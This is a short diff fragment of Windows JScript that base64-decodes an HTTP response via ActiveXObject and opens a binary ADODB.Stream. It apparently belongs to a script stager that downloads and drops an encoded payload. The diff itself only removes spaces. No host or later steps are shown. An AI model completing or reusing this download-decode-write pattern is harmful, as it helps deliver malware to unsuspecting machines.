@@ -6,7 +6,7 @@ enc=new ActiveXObject("System.Text.ASCIIEncoding");
 length=enc.GetByteCount_2(h.ResponseText);
 ba=enc.GetBytes_4(h.ResponseText);
 transform=new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
-ba=transform.TransformFinalBlock(ba, 0, length);
+ba=transform.TransformFinalBlock(ba,0,length);
 s=new ActiveXObject("ADODB.Stream");
 s.Type=1;
 s.Open();
